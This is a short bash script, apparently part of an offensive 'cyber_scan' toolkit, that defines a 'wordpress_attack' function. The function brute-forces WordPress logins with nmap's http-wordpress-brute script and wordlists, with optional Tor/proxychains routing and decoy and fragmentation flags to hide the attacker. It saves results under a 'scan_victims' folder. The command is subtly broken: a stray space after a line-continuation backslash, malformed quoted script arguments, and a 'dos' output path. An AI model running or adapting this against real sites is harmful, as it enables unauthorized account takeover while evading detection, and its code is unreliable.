#! /bin/bash

source ./cyber_scan/lib/settings/services.sh
source ./cyber_scan/lib/scan/helpers/inputs.sh
source ./cyber_scan/validators/ipv4_validator.sh
source ./cyber_scan/lib/scan/helpers/create_dir.sh
source ./cyber_scan/lib/util/success_output.sh
source ./cyber_scan/assets/set_color.sh


function wordpress_attack()
{
	services "Wordpress attack"

        proxychains_input
        if [[ $proxychains == [Yy] ]]; then
                is_tor="proxychains"
        else
                is_tor=""
        fi

	dns_input
        ipv4_validator "$dns"
        if [ $? -ne 0 ]; then
                return 1
        fi

        domain_input

	debug_mode
	if [[ $debug == [Yy] ]]; then
		debug_flag="-d"
	else
		debug_flag=""
	fi

        dir_input
        create_dir "$dir_name/attacks/wordpress"


	$is_tor nmap -sV -p"$ports" --script=http-wordpress-brute \
	 --script-args='userdb=users.txt,passdb=passwds.txt,http-wordpress-brute."$domain",http-wordpress-brute.threads=3,brute.firstonly=true' \
	 -f --send-eth -D RND:3 \ 
	 $debug_flag -oN "scan_victims/$dir_name/attacks/wordpress/$dns.nmap" "$dns"

	success_output "$dir_name" "attacks/dos" "$dns.nmap"
}
